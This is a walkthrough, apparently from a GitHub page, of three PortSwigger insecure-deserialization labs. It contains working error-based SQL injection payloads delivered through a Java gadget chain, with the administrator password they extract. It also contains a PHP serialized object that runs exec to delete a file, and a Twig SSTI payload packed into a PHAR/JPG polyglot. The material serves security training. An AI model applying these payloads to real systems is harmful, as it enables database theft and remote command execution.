## Labs Covered

This write-up focuses on the following **EXPERT-level labs** from the PortSwigger Web Security Academy related to **Insecure Deserialization**:

**Developing a custom gadget chain for Java deserialization**  
This lab demonstrates how attackers can analyze and build custom gadget chains for exploiting insecure Java deserialization vulnerabilities.

**Developing a custom gadget chain for PHP deserialization**  
This lab shows how attackers can create custom gadget chains tailored for PHP applications to achieve code execution through insecure deserialization.

**Using PHAR deserialization to deploy a custom gadget chain**  
This lab demonstrates how attackers can leverage PHAR archives to trigger insecure PHP deserialization and execute custom gadget chains.

---

### LAB 8 - Developing a custom gadget chain for Java deserialization

### Lab Description

<img width="874" height="651" alt="image" src="https://github.com/user-attachments/assets/1588416c-c112-4416-ad36-0599dcd60952" />

### Overview: Creating Your Own Exploit for Insecure Deserialization

When **pre-built gadget chains** (like those in `ysoserial` or `PHPGGC`) fail to exploit an insecure deserialization vulnerability, the next step is to **craft your own exploit** — usually by building a **custom gadget chain** tailored to the application's codebase.

---

### 1. **Source Code Access is Essential**

* Creating a gadget chain **without source code** is extremely difficult and usually impractical.
* You need the source code to:

  * Understand object structures
  * Track **magic method** invocation (`__wakeup()`, `readObject()`, etc.)
  * Trace control flow
  * Spot user-controllable inputs and dangerous operations

---

### 2. **Find the Kick-off Gadget**

* Search for a class with a **magic method** that is automatically called during deserialization.

  * **PHP**: `__wakeup()`, `__destruct()`, `__call()`
  * **Java**: `readObject()`, `readResolve()`
* Analyze this method to check:

  * Does it access any user-controlled properties?
  * Does it perform dangerous operations like file access, command execution, or network calls?

> 🔍 *If the kick-off gadget isn’t directly dangerous, it may still call other methods — these become part of the chain.*

---

### 3. **Trace the Execution Chain**

* From the kick-off gadget, **recursively trace** the flow of method calls.
* Look for:

  * **Reflection or dynamic code execution**
  * **File system interaction**
  * **Deserialization of nested objects**
  * **Eval or system() usage**

You’re essentially looking for a **sink gadget**: a method where attacker-controlled data reaches a **sensitive operation**.

---

### 4. **Build the Payload**

Once you have:

* A gadget chain (kick-off → ... → sink)
* Knowledge of which values you can control

You can now:

* Create a **serialized object** (manually or via code)
* Set required property values to carry the payload through the chain

#### String-based formats:

* Easier to handcraft payloads (e.g., PHP’s `serialize()`)

#### Binary-based formats (e.g., Java):

* More complex
* Best to **write Java code** to:

  * Instantiate the chain
  * Set property values
  * Call `ObjectOutputStream.writeObject()` to serialize

---

### 5. **Trigger Secondary Vulnerabilities (if applicable)**

Your custom gadget chain can be a **delivery mechanism** for secondary attacks, such as:

* **Path traversal**
* **Command injection**
* **XXE or deserialization-based SSRF**
* **Privilege escalation through object mutation**

Look for logic in the sink that can be combined with another class or gadget for chaining.

---

### Summary Steps

| Step                    | Description                                    |
| ----------------------- | ---------------------------------------------- |
| **1. Source Review**    | Identify magic methods and dangerous classes   |
| **2. Kick-off Gadget**  | Locate magic method entry point                |
| **3. Gadget Chain**     | Follow method calls to find a sink             |
| **4. Payload Crafting** | Serialize custom object with controlled values |
| **5. Test and Refine**  | Send payload and observe behavior              |

---



### Solution


First when I enter carlos and enter username and password and intercept it we can see that it's java serilized and decode the cookie

<img width="1589" height="657" alt="image" src="https://github.com/user-attachments/assets/8c45f0cc-6618-4a1c-bcc8-302ee12143fc" />


Let’s decode the session cookie.


<img width="1590" height="670" alt="image" src="https://github.com/user-attachments/assets/f229cfa6-68fe-412c-aa2a-523528f1e804" />



Now if we look at the source of the html page, we can see this commented code <! — <a href=/backup/AccessTokenUser.java>Example user</a> → . Going to /backup endpoint we find two java file.



<img width="1129" height="389" alt="image" src="https://github.com/user-attachments/assets/02196c88-2b67-4c4c-a235-113c8e7446d2" />



`AccessTokenUsre.java` is the class that is getting serialized and being returned in the session cookie. Pay attention to username and accessToken fields.


<img width="1309" height="590" alt="image" src="https://github.com/user-attachments/assets/80594f23-1754-4071-97c5-b11adf3600aa" />


Now lets look at the **ProductTemplate.java** source code. **ProductTemplate.readObject()** method invokes **inputStream.defaultReadObject();** **readObject()** method will be called when deserializing the serialized ProductTemplate object. Also we can see a constructor initializing field id

One more thing to notice is that, there is one sql query which is using this id field directly into the query. Clear case of sql injection here.



So our exploit steps would be
	1. Create a serialized object from the product template java file obtained earlier. Put in our payload in the id field and base64 encode the serialized object
	2. Use the base64 encoded value from step1 in the session cookie. Once this value is deserialized ( readObject() will be invoked ) we can exploit the sql injection using our payload in id field.
	3. Sql query will be executed, since it’s in the readObject() method which will be called during deserialization
	4. Note that private transient Product product is transient, so this field will not be serialized.
	5. Once we extract the administrator password exploiting sql injection, we delete the carlos account and solve the lab.


<img width="1383" height="970" alt="image" src="https://github.com/user-attachments/assets/e743b78c-0402-40bf-acbe-52733ce47435" />




Port Swigger already provided the sample java files which can be used to create the serialized object  `https://github.com/PortSwigger/serialization-examples/tree/master/java/solution`. Copy the files in your local folder and compile them.


File contain in the github 


<img width="822" height="392" alt="image" src="https://github.com/user-attachments/assets/d14d9207-ec9d-4257-9118-c06e8841db95" />


So we intercpted file which is deserilzed and sql injection happaen in it

We will create a serialized object with value of id as ' — single quote.


<img width="1399" height="222" alt="image" src="https://github.com/user-attachments/assets/696edf50-697d-473a-adb0-fd64d2d3db5e" />


<img width="1884" height="746" alt="image" src="https://github.com/user-attachments/assets/0b51598b-0501-45ed-9dd8-ef7e4374851a" />


Remainder:


<img width="1091" height="535" alt="image" src="https://github.com/user-attachments/assets/a55f77b2-ebe4-487a-a0e8-c0f205391211" />


### Number of columns
But first, we will use union query to first find out the number of columns in the products table. Use the union payload "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables --"increasing the number of NULL to find the number of columns, which will come out to be 8.

### Finding out table name

**Payload **— java Main `"' UNION SELECT NULL,NULL,NULL,NULL,CAST(table_name AS numeric),null,null,null from information_schema.tables -- "`
Error in the response `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;users&quot;</p>` revealing table name as users



<img width="1903" height="732" alt="image" src="https://github.com/user-attachments/assets/8fc3de1d-4106-4383-8363-b33615585821" />






## Column name
**payload1** — `' UNION SELECT NULL,NULL,NULL,NULL,CAST(column_name AS numeric),null,null,null from information_schema.columns where table_name = 'users' --`
**Error in response1** — `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;username&quot;</p>`
**payload2** — `'UNION SELECT NULL,NULL,NULL,NULL,CAST(column_name AS numeric),null,null,null from information_schema.columns where table_name = 'users' and column_name !='username'--`
**Error in response2** — `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;password&quot;</p>`
now that we know the table name and column names we can extract the password of the user administrator.
### Extracting administrator password
**payload** — `'UNION SELECT NULL,NULL,NULL,NULL,CAST(password AS numeric),null,null,null from users where username='administrator' --`
**error in response** — `<p class=is-warning>org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;albhslljyvji9rxzbill&quot;</p>`


<img width="1920" height="742" alt="image" src="https://github.com/user-attachments/assets/41a030f4-f4e2-4645-8e14-f9116f1ff71f" />




Now we can login as administrator and delete the carlos account to solve the lab.



<img width="1828" height="651" alt="image" src="https://github.com/user-attachments/assets/701e973d-44a8-4230-a7ea-3206d439aa38" />


By carefully studying the source code, you can discover longer gadget chains that potentially allow you to construct high-severity attacks, often including remote code execution.



---

### LAB 9 - Developing a custom gadget chain for PHP deserialization

### Lab Description

<img width="883" height="512" alt="image" src="https://github.com/user-attachments/assets/954a223a-b837-4359-9fbf-1911a4f0cc08" />

### Solution

Login the account and look at the cookie we can see that it might be `base64` decode cookie.


<img width="1906" height="791" alt="image" src="https://github.com/user-attachments/assets/55f92a6a-0585-40d6-8734-41494db5a319" />


Decoding wit  base64 we get the following code `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"cftzj8vyuty1u8qbvnsufbamwguwfm4g";}`



<img width="1918" height="438" alt="image" src="https://github.com/user-attachments/assets/57a44ee2-e7e0-46ae-a879-c6f2f183a5fc" />



As we can see that in the comment  we have a refernce php file


<img width="1403" height="825" alt="image" src="https://github.com/user-attachments/assets/10ce2c1f-8f4c-4adb-8029-81df06a3709a" />


Accessing the file directly doesnot give me anything 



<img width="1367" height="258" alt="image" src="https://github.com/user-attachments/assets/eb9c2405-a080-433b-b531-1385647147bf" />


So after entering tilde ~  sign at the end of php.The tilde ~ at the end of the file name typically indicates that it's a backup or temporary file created by some text editors or version control systems.after that we can read it
In the source code, notice that the `__wakeup()` magic method for a CustomTemplate will create a new Product by referencing the `default_desc_type` and desc from the CustomTemplate.



<img width="1058" height="974" alt="image" src="https://github.com/user-attachments/assets/88565ae6-84d0-4dc0-b8ca-d87df97c80e3" />



Also notice that the `DefaultMa` class has the `__get()` magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes `call_user_func()`, which will execute any function that is passed into it via the `DefaultMap->callback` attribute. The function will be executed on the $name, which is the non-existent attribute that was requested.
You can exploit this gadget chain to invoke exec(**rm /home/carlos/morale.txt**) by passing in a CustomTemplate object where:

```

CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"

```

If you follow the data flow in the source code, you will notice that this causes the Product constructor to try and fetch the default_desc_type from the DefaultMap object. As it doesn't have this attribute, the __get() method will invoke the callback exec() method on the default_desc_type, which is set to our shell command



<img width="691" height="630" alt="image" src="https://github.com/user-attachments/assets/ec24eae1-b7ec-4092-8e2b-5c46a5875f13" />




To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie:

```

O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}

```




So we encode the above  code with base64 

<img width="1265" height="432" alt="image" src="https://github.com/user-attachments/assets/13b9b471-fed4-4814-b750-d90d30abc425" />


And changing cookie to above base64  serilized code




<img width="1877" height="760" alt="image" src="https://github.com/user-attachments/assets/3fdd62ae-07b7-492f-bdf3-e7fce7f0a89d" />



The above  base64 serilized code give us error and lab is solved

<img width="1713" height="837" alt="image" src="https://github.com/user-attachments/assets/559509c4-0eff-4508-afc8-c2b5e5dcb0b3" />


Even if you can't find a gadget chain that's ready to use, you may still gain valuable knowledge that helps you create your own custom exploit.



---

### LAB 10 - Using PHAR deserialization to deploy a custom gadget chain

### Lab Description

<img width="815" height="332" alt="image" src="https://github.com/user-attachments/assets/7e7cb5ae-b54f-43ad-a46c-126377e6d268" />

### Overview: PHAR Deserialization in PHP

**PHAR deserialization** is a technique that allows attackers to exploit insecure deserialization vulnerabilities **even when the `unserialize()` function is not explicitly used** by the application.

---

###  What is PHAR? 

PHAR stands for **PHP Archive**. It is a file format (like `.zip`) that can bundle multiple PHP files and metadata into a single package. These archives are often used for distributing PHP libraries or applications.

But here's the key point:

> **PHAR files contain serialized metadata**, and **PHP implicitly deserializes this metadata** when certain file-related operations are performed on a `phar://` stream.

---

###  Exploitation Technique 

#### 1. **Triggering Deserialization with `phar://`**

PHP provides a **stream wrapper** called `phar://` which allows access to PHAR contents via file system functions (like `file_exists()`, `stat()`, `is_file()`, etc.).

If you pass a PHAR file using this wrapper into one of these functions, PHP **automatically deserializes the embedded metadata**, even if `unserialize()` was never called in the code.

#### 2. **Creating a PHAR-based Exploit**

* You create a **malicious PHAR file** whose metadata includes a **serialized object**.
* This object contains a **magic method** like `__wakeup()` or `__destruct()` that initiates your exploit or gadget chain.
* You then **upload this file** to the server (e.g., via a file upload form).
* Finally, you find a way to make the application interact with your file via the `phar://` wrapper.

#### 3. **Bypassing Upload Filters**

* Websites often restrict file uploads to specific file extensions like `.jpg` or `.png`.
* To bypass this, attackers use a **polyglot file**: a file that is **both a valid image and a valid PHAR archive**.

  * This tricks the upload filter (which sees an image), while PHP still processes it as a PHAR.
  * PHP doesn’t care about the file extension when using `phar://`.

---

###  Vulnerable Function Example 

```php
// No use of unserialize(), looks safe
if (file_exists($_GET['file'])) {
    echo "File exists.";
}
```

But if an attacker can pass `phar://uploads/malicious.jpg`, and `malicious.jpg` is a PHAR with a serialized payload in the metadata, then the **metadata will be deserialized** and any embedded magic method will be executed.

---

###  Key Takeaways 

| Concept                       | Details                                                        |
| ----------------------------- | -------------------------------------------------------------- |
| **PHAR Archive**              | Can contain serialized PHP metadata                            |
| **Deserialization Trigger**   | Happens when using `phar://` with file operations              |
| **No `unserialize()` needed** | PHP handles deserialization implicitly                         |
| **Payload Vector**            | Malicious object with `__wakeup()` or `__destruct()`           |
| **Delivery**                  | Upload PHAR (e.g., as image polyglot) and access via `phar://` |
| **Real-World Use**            | Listed in top 10 web hacking techniques (2018)                 |

---

### Solution


Before we login we see cookie decode  it doesnot reveal anything

<img width="1615" height="829" alt="image" src="https://github.com/user-attachments/assets/0743b1ea-fa1f-4777-9438-4dc69117d5fb" />


Decoding above cookie doesnot give and serilized code.

<img width="1907" height="294" alt="image" src="https://github.com/user-attachments/assets/b2604190-981e-42e6-8a9e-77d4a9c218b2" />



After we login as winer:peter we see cookie decode  it doesnot reveal anything

<img width="1140" height="923" alt="image" src="https://github.com/user-attachments/assets/0f5b3f80-2f73-4b4c-8ca1-f7d92aa2309e" />



Decoding above cookie doesnot give and serilized code.



<img width="392" height="307" alt="image" src="https://github.com/user-attachments/assets/2260b97b-5d7c-49f0-80a1-4faae3fcc391" />



 We need explore the website with burp suite.
Ok, at the moment only viewed csrf... but not its our goal... we saw in target the /cg-bin directory, we need explore this directory


<img width="1824" height="446" alt="image" src="https://github.com/user-attachments/assets/bf0a1bc2-c2fd-443a-b0ca-a055e912cc7c" />




In here, we can upload an avatar image file.
We can try to upload a valid image file:

We can also see Avatar


<img width="1595" height="645" alt="image" src="https://github.com/user-attachments/assets/1ff87bbc-4cde-4447-a1f8-4f69edb6f54c" />


Burp Suite HTTP history:



<img width="1250" height="807" alt="image" src="https://github.com/user-attachments/assets/e9e0b878-a54d-45c9-ba8b-2695a6f5dfb4" />




<img width="1019" height="741" alt="image" src="https://github.com/user-attachments/assets/fa4190bc-6569-4739-9fc4-c85cf83d8ae3" />



We can see below which method is calling wiener avatar poicture


<img width="1560" height="253" alt="image" src="https://github.com/user-attachments/assets/f49130b7-efbf-4016-ba44-1f965d017c5e" />


As you can see, it has 3 PHP files: **CustomTemplate.php, Blog.php, avatar.php.**

The first two of them’s source code can be view, as it appended a **~** character is the end of the extension.


<img width="968" height="413" alt="image" src="https://github.com/user-attachments/assets/0e49e4be-2a4b-4476-b8bf-829cc1c9c0a4" />



**CustomTemplate.php:**

 source= `https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-10/`

As you can see, it has 3 PHP files: CustomTemplate.php, Blog.php, avatar.php.
The first two of them’s source code can be view, as it appended a ~ character is the end of the extension.
CustomTemplate.php:

In `CustomTemplate.php`, there is a class called CustomTemplate.
Also, there is a `__destruct()` magic method, which will be invoked when the PHP script is stopped or exited.
When this method is invoked, it’ll delete a file from `CustomTemplate->lockFilePath()`, which is `templates/$CustomTemplate->template_file_path.lock`.
Moreover, the `isTemplateLocked()` method is using `file_exists()` method on `CustomTemplate->lockFilePath()` attribute.

In Blog.php, it uses Twig template engine, and there is a class called Blog.
The `__wakeup()` magic method is interesting for us, as it’ll automatically invoked during the deserialization process.
When the `__wakeup()` magic method is invoked, it’ll create a new object from `Twig_Environment(),` and it’s referring the Blog->desc attribute.
Armed with above information, we can exploit SSTI (Server-Side Template Injection) and using PHAR stream to gain remote code execution!


### Blog.php:

In Blog.php, it uses Twig template engine, and there is a class called Blog.
The __wakeup() magic method is interesting for us, as it’ll automatically invoked during the deserialization process.
When the __wakeup() magic method is invoked, it’ll create a new object from Twig_Environment(), and it’s referring the Blog->desc attribute.
Armed with above information, we can exploit SSTI (Server-Side Template Injection) and using PHAR stream to gain remote code execution!
	• SSTI:

Now we have a SSTI payload, we can build a PHP payload:

<img width="1249" height="579" alt="image" src="https://github.com/user-attachments/assets/159ab062-4325-4eef-b7a7-bd30d594db2e" />



This payload will set a SSTI payload in the Blog->desc attribute, which will then parsed to CustomTemplate->template_file_path.
Finally, we can create a PHAR payload.
According to this GitHub repository, we can create a PHAR JPG ploygot:
```

┌[root♥siunam]-(/opt)-[2024.01.13|13:22:05]
└> git clone https://github.com/kunte0/phar-jpg-polyglot.git;cd phar-jpg-polyglot

```


<img width="990" height="779" alt="image" src="https://github.com/user-attachments/assets/77dc491c-ce58-4fac-b702-2145d59a1690" />




### phar_jpg_polyglot.php:


<img width="558" height="457" alt="image" src="https://github.com/user-attachments/assets/f24917af-9844-4a1c-9134-62627bbba927" />


Only change we have done in `phar_jpg_polyglot.php`:  github code is  pop exploit code


<img width="1265" height="559" alt="image" src="https://github.com/user-attachments/assets/d259b928-0db5-418b-8f35-65d0d18e0508" />




No run this in linux

```bash

┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2024.01.13|15:23:58]-[git://master ✗]
└> php -cphp.ini phar_jpg_polyglot.php
string(229)"O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:17:"any_user_you_want";s:4:"desc";s:106:"\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}";}}"
┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2024.01.13|15:23:58]-[git://master ✗]
└> ls-lahout.jpg     
-rw-r--r--1 root root 132K Jan 13 15:23 out.jpg

```


Upload it and lab is solved:

<img width="1581" height="817" alt="image" src="https://github.com/user-attachments/assets/3ef76f97-41ba-4da1-b5d3-813291976019" />

----



---
